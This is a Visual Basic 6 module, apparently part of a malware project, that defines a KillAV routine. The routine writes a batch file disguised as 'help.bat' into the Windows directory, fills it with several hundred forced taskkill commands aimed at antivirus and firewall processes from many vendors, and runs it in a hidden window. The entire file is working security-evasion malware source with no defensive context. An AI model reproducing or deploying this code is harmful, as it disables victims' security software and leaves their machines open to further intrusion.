Attribute VB_Name = "mod_av"
Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private WinDir As String


Public Sub KillAV()
Dim path As String
Dim temp As String * 256
Dim x
x = GetWindowsDirectory(temp, Len(temp))
WinDir = Left$(temp, x)

path = WinDir & "\help.bat"
Kill WinDir & "\help.bat"
Open WinDir & "\help.bat" For Binary Access Write As #1
Put #1, , "@echo off" & vbNewLine
Put #1, , "taskkill /F /IM _AVPCC.exe" & vbNewLine
Put #1, , "taskkill /F /IM _AVPM.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVWUPSRV.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGUARD.exe" & vbNewLine
Put #1, , "taskkill /F /IM nod32kui.exe" & vbNewLine
Put #1, , "taskkill /F /IM nod32krn.exe" & vbNewLine
Put #1, , "taskkill /F /IM ACKWIN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM ACKWIN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM ACKWIN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM ADVXDWIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM agentw.exe" & vbNewLine
Put #1, , "taskkill /F /IM ALERTSVC.exe" & vbNewLine
Put #1, , "taskkill /F /IM ALOGSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM ALOGSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM AMON9X.exe" & vbNewLine
Put #1, , "taskkill /F /IM ANTI -TROJAN.exe" & vbNewLine
Put #1, , "taskkill /F /IM ANTS.exe" & vbNewLine
Put #1, , "taskkill /F /IM apvxdwin.exe" & vbNewLine
Put #1, , "taskkill /F /IM apvxdwin.exe" & vbNewLine
Put #1, , "taskkill /F /IM ATCON.exe" & vbNewLine
Put #1, , "taskkill /F /IM ATUPDATER.exe" & vbNewLine
Put #1, , "taskkill /F /IM ATWATCH.exe" & vbNewLine
Put #1, , "taskkill /F /IM AUTODOWN.exe" & vbNewLine
Put #1, , "taskkill /F /IM AUTODOWN.exe" & vbNewLine
Put #1, , "taskkill /F /IM AUTODOWN.exe" & vbNewLine
Put #1, , "taskkill /F /IM AutoTrace.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVCONSOL.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGCC32.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGCC32.exe" & vbNewLine
Put #1, , "taskkill /F /IM Avgctrl.exe" & vbNewLine
Put #1, , "taskkill /F /IM Avgctrl.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGSERV9.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVGW.exe" & vbNewLine
Put #1, , "taskkill /F /IM avkpop.exe" & vbNewLine
Put #1, , "taskkill /F /IM AvkServ.exe" & vbNewLine
Put #1, , "taskkill /F /IM avkservice.exe" & vbNewLine
Put #1, , "taskkill /F /IM avkwctl9.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVP.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVP32.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVPM.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVPM.exe" & vbNewLine
Put #1, , "taskkill /F /IM Avsched32.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVSYNMGR.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVWINNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXMONITOR9X.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXMONITOR9X.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXMONITORNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXMONITORNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXQUAR.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXQUAR.exe.exe" & vbNewLine
Put #1, , "taskkill /F /IM AVXW.exe" & vbNewLine
Put #1, , "taskkill /F /IM BLACKD.exe" & vbNewLine
Put #1, , "taskkill /F /IM BLACKD.exe" & vbNewLine
Put #1, , "taskkill /F /IM BlackICE.exe" & vbNewLine
Put #1, , "taskkill /F /IM ccApp.exe" & vbNewLine
Put #1, , "taskkill /F /IM ccEvtMgr.exe" & vbNewLine
Put #1, , "taskkill /F /IM ccPxySvc.exe" & vbNewLine
Put #1, , "taskkill /F /IM ccPxySvc.exe" & vbNewLine
Put #1, , "taskkill /F /IM CDP.exe" & vbNewLine
Put #1, , "taskkill /F /IM cfgWiz.exe" & vbNewLine
Put #1, , "taskkill /F /IM CLAW95.exe" & vbNewLine
Put #1, , "taskkill /F /IM CLAW95.exe" & vbNewLine
Put #1, , "taskkill /F /IM CLAW95.exe" & vbNewLine
Put #1, , "taskkill /F /IM CLAW95CF.exe" & vbNewLine
Put #1, , "taskkill /F /IM CLAW95CF.exe" & vbNewLine
Put #1, , "taskkill /F /IM cleaner.exe" & vbNewLine
Put #1, , "taskkill /F /IM cleaner3.exe" & vbNewLine
Put #1, , "taskkill /F /IM CMGRDIAN.exe" & vbNewLine
Put #1, , "taskkill /F /IM CONNECTIONMONITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM cpd.exe" & vbNewLine
Put #1, , "taskkill /F /IM cpd.exe" & vbNewLine
Put #1, , "taskkill /F /IM CPDClnt.exe" & vbNewLine
Put #1, , "taskkill /F /IM CPDClnt.exe" & vbNewLine
Put #1, , "taskkill /F /IM CTRL.exe" & vbNewLine
Put #1, , "taskkill /F /IM defalert.exe" & vbNewLine
Put #1, , "taskkill /F /IM defscangui.exe" & vbNewLine
Put #1, , "taskkill /F /IM DEFWATCH.exe" & vbNewLine
Put #1, , "taskkill /F /IM DOORS.exe" & vbNewLine
Put #1, , "taskkill /F /IM DVP95.exe" & vbNewLine
Put #1, , "taskkill /F /IM DVP95_0.exe" & vbNewLine
Put #1, , "taskkill /F /IM EFPEADM.exe" & vbNewLine
Put #1, , "taskkill /F /IM ETRUSTCIPE.exe" & vbNewLine
Put #1, , "taskkill /F /IM ETRUSTCIPE.exe" & vbNewLine
Put #1, , "taskkill /F /IM EVPN.exe" & vbNewLine
Put #1, , "taskkill /F /IM EVPN.exe" & vbNewLine
Put #1, , "taskkill /F /IM EXPERT.exe" & vbNewLine
Put #1, , "taskkill /F /IM F -AGNT95.exe" & vbNewLine
Put #1, , "taskkill /F /IM fameh32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fch32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fih32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fnrb32.exe" & vbNewLine
Put #1, , "taskkill /F /IM F -PROT.exe" & vbNewLine
Put #1, , "taskkill /F /IM F -PROT95.exe" & vbNewLine
Put #1, , "taskkill /F /IM FP -WIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM FRW.exe" & vbNewLine
Put #1, , "taskkill /F /IM FRW.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsaa.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsav32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsgk32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsm32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsma32.exe" & vbNewLine
Put #1, , "taskkill /F /IM fsmb32.exe" & vbNewLine
Put #1, , "taskkill /F /IM F -STOPW.exe" & vbNewLine
Put #1, , "taskkill /F /IM F -STOPW.exe" & vbNewLine
Put #1, , "taskkill /F /IM gbmenu.exe" & vbNewLine
Put #1, , "taskkill /F /IM gbpoll.exe" & vbNewLine
Put #1, , "taskkill /F /IM gbpoll.exe" & vbNewLine
Put #1, , "taskkill /F /IM GENERICS.exe" & vbNewLine
Put #1, , "taskkill /F /IM GUARD.exe" & vbNewLine
Put #1, , "taskkill /F /IM GUARD.exe" & vbNewLine
Put #1, , "taskkill /F /IM GUARDDOG.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMAPP.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMAPP.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMAPP.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM IAMSTATS.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICLOAD95.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICLOADNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICLOADNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICSUPP95.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICSUPP95.exe" & vbNewLine
Put #1, , "taskkill /F /IM ICSUPPNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM IFACE.exe" & vbNewLine
Put #1, , "taskkill /F /IM IOMON98.exe" & vbNewLine
Put #1, , "taskkill /F /IM IOMON98.exe" & vbNewLine
Put #1, , "taskkill /F /IM ISRV95.exe" & vbNewLine
Put #1, , "taskkill /F /IM JEDI.exe" & vbNewLine
Put #1, , "taskkill /F /IM LDNETMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM LDPROMENU.exe" & vbNewLine
Put #1, , "taskkill /F /IM LDSCAN.exe" & vbNewLine
Put #1, , "taskkill /F /IM LOCKDOWN.exe" & vbNewLine
Put #1, , "taskkill /F /IM LOCKDOWN2000.exe" & vbNewLine
Put #1, , "taskkill /F /IM LOCKDOWN2000.exe" & vbNewLine
Put #1, , "taskkill /F /IM LUALL.exe" & vbNewLine
Put #1, , "taskkill /F /IM LUCOMSERVER.exe" & vbNewLine
Put #1, , "taskkill /F /IM LUSPT.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCAGENT.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCMNHDLR.exe" & vbNewLine
Put #1, , "taskkill /F /IM Mcshield.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCTOOL.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCUPDATE.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCVSRTE.exe" & vbNewLine
Put #1, , "taskkill /F /IM MCVSSHLD.exe" & vbNewLine
Put #1, , "taskkill /F /IM MGAVRTCL.exe" & vbNewLine
Put #1, , "taskkill /F /IM MGAVRTE.exe" & vbNewLine
Put #1, , "taskkill /F /IM MGHTML.exe" & vbNewLine
Put #1, , "taskkill /F /IM MINILOG.exe" & vbNewLine
Put #1, , "taskkill /F /IM MONITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM MONITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM MOOLIVE.exe" & vbNewLine
Put #1, , "taskkill /F /IM MPFAGENT.exe" & vbNewLine
Put #1, , "taskkill /F /IM MPFSERVICE.exe" & vbNewLine
Put #1, , "taskkill /F /IM MPFTRAY.exe" & vbNewLine
Put #1, , "taskkill /F /IM MWATCH.exe" & vbNewLine
Put #1, , "taskkill /F /IM MWATCH.exe" & vbNewLine
Put #1, , "taskkill /F /IM navapsvc.exe" & vbNewLine
Put #1, , "taskkill /F /IM navapsvc.exe" & vbNewLine
Put #1, , "taskkill /F /IM NAVAPW32.exe" & vbNewLine
Put #1, , "taskkill /F /IM NAVLU32.exe" & vbNewLine
Put #1, , "taskkill /F /IM Navw32.exe" & vbNewLine
Put #1, , "taskkill /F /IM NAVWNT.exe" & vbNewLine
Put #1, , "taskkill /F /IM NDD32.exe" & vbNewLine
Put #1, , "taskkill /F /IM NeoWatchLog.exe" & vbNewLine
Put #1, , "taskkill /F /IM NETUTILS.exe" & vbNewLine
Put #1, , "taskkill /F /IM NISSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM NISSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM NISSERV.exe" & vbNewLine
Put #1, , "taskkill /F /IM NISUM.exe" & vbNewLine
Put #1, , "taskkill /F /IM NISUM.exe" & vbNewLine
Put #1, , "taskkill /F /IM NMAIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM NORMIST.exe" & vbNewLine
Put #1, , "taskkill /F /IM NORMIST.exe" & vbNewLine
Put #1, , "taskkill /F /IM notstart.exe" & vbNewLine
Put #1, , "taskkill /F /IM NPROTECT.exe" & vbNewLine
Put #1, , "taskkill /F /IM npscheck.exe" & vbNewLine
Put #1, , "taskkill /F /IM NPSSVC.exe" & vbNewLine
Put #1, , "taskkill /F /IM NSCHED32.exe" & vbNewLine
Put #1, , "taskkill /F /IM ntrtscan.exe" & vbNewLine
Put #1, , "taskkill /F /IM NTVDM.exe" & vbNewLine
Put #1, , "taskkill /F /IM NTXconfig.exe" & vbNewLine
Put #1, , "taskkill /F /IM Nui.exe" & vbNewLine
Put #1, , "taskkill /F /IM Nupgrade.exe" & vbNewLine
Put #1, , "taskkill /F /IM NVC95.exe" & vbNewLine
Put #1, , "taskkill /F /IM NVC95.exe" & vbNewLine
Put #1, , "taskkill /F /IM NWService.exe" & vbNewLine
Put #1, , "taskkill /F /IM NWTOOL16.exe" & vbNewLine
Put #1, , "taskkill /F /IM PADMIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM pavproxy.exe" & vbNewLine
Put #1, , "taskkill /F /IM pavproxy.exe" & vbNewLine
Put #1, , "taskkill /F /IM PCCIOMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM PCCIOMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM pccntmon.exe" & vbNewLine
Put #1, , "taskkill /F /IM pccwin97.exe" & vbNewLine
Put #1, , "taskkill /F /IM PCCWIN98.exe" & vbNewLine
Put #1, , "taskkill /F /IM pcscan.exe" & vbNewLine
Put #1, , "taskkill /F /IM PERSFW.exe" & vbNewLine
Put #1, , "taskkill /F /IM PERSWF.exe" & vbNewLine
Put #1, , "taskkill /F /IM POP3TRAP.exe" & vbNewLine
Put #1, , "taskkill /F /IM POPROXY.exe" & vbNewLine
Put #1, , "taskkill /F /IM PORTMONITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM PROCESSMONITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM PROGRAMAUDITOR.exe" & vbNewLine
Put #1, , "taskkill /F /IM PVIEW95.exe" & vbNewLine
Put #1, , "taskkill /F /IM rapapp.exe" & vbNewLine
Put #1, , "taskkill /F /IM RAV7.exe" & vbNewLine
Put #1, , "taskkill /F /IM RAV7WIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM REALMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM RESCUE.exe" & vbNewLine
Put #1, , "taskkill /F /IM RESCUE.exe" & vbNewLine
Put #1, , "taskkill /F /IM RTVSCN95.exe" & vbNewLine
Put #1, , "taskkill /F /IM RULAUNCH.exe" & vbNewLine
Put #1, , "taskkill /F /IM sbserv.exe" & vbNewLine
Put #1, , "taskkill /F /IM SCAN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM SCRSCAN.exe" & vbNewLine
Put #1, , "taskkill /F /IM SMC.exe" & vbNewLine
Put #1, , "taskkill /F /IM SPHINX.exe" & vbNewLine
Put #1, , "taskkill /F /IM SPHINX.exe" & vbNewLine
Put #1, , "taskkill /F /IM SPYXX.exe" & vbNewLine
Put #1, , "taskkill /F /IM SS3EDIT.exe" & vbNewLine
Put #1, , "taskkill /F /IM SWEEP95.exe" & vbNewLine
Put #1, , "taskkill /F /IM SWNETSUP.exe" & vbNewLine
Put #1, , "taskkill /F /IM SymProxySvc.exe" & vbNewLine
Put #1, , "taskkill /F /IM SYMTRAY.exe" & vbNewLine
Put #1, , "taskkill /F /IM TAUMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM TC.exe" & vbNewLine
Put #1, , "taskkill /F /IM TCA.exe" & vbNewLine
Put #1, , "taskkill /F /IM TCM.exe" & vbNewLine
Put #1, , "taskkill /F /IM TDS-3.exe" & vbNewLine
Put #1, , "taskkill /F /IM TFAK.exe" & vbNewLine
Put #1, , "taskkill /F /IM vbcmserv.exe" & vbNewLine
Put #1, , "taskkill /F /IM vbcmserv.exe" & vbNewLine
Put #1, , "taskkill /F /IM VbCons.exe" & vbNewLine
Put #1, , "taskkill /F /IM VbCons.exe" & vbNewLine
Put #1, , "taskkill /F /IM VET32.exe" & vbNewLine
Put #1, , "taskkill /F /IM VET32.exe" & vbNewLine
Put #1, , "taskkill /F /IM VET95.exe" & vbNewLine
Put #1, , "taskkill /F /IM VET95.exe" & vbNewLine
Put #1, , "taskkill /F /IM VETTRAY.exe" & vbNewLine
Put #1, , "taskkill /F /IM VETTRAY.exe" & vbNewLine
Put #1, , "taskkill /F /IM VIR -HELP.exe" & vbNewLine
Put #1, , "taskkill /F /IM VPTRAY.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSCHED.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSECOMR.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSECOMR.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSHWIN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSMAIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSMON.exe" & vbNewLine
Put #1, , "taskkill /F /IM VSSTAT.exe" & vbNewLine
Put #1, , "taskkill /F /IM WATCHDOG.exe" & vbNewLine
Put #1, , "taskkill /F /IM WEBSCANX.exe" & vbNewLine
Put #1, , "taskkill /F /IM WEBTRAP.exe" & vbNewLine
Put #1, , "taskkill /F /IM WGFE95.exe" & vbNewLine
Put #1, , "taskkill /F /IM WIMMUN32.exe" & vbNewLine
Put #1, , "taskkill /F /IM WRADMIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM WRADMIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM WRADMIN.exe" & vbNewLine
Put #1, , "taskkill /F /IM WRCTRL.exe" & vbNewLine
Put #1, , "taskkill /F /IM WRCTRL.exe" & vbNewLine
Put #1, , "taskkill /F /IM zapro.exe" & vbNewLine
Put #1, , "taskkill /F /IM zonealarm.exe" & vbNewLine
Put #1, , "exit"
Close #1
Call Shell("cmd.exe /c" & path, vbHide)
End Sub





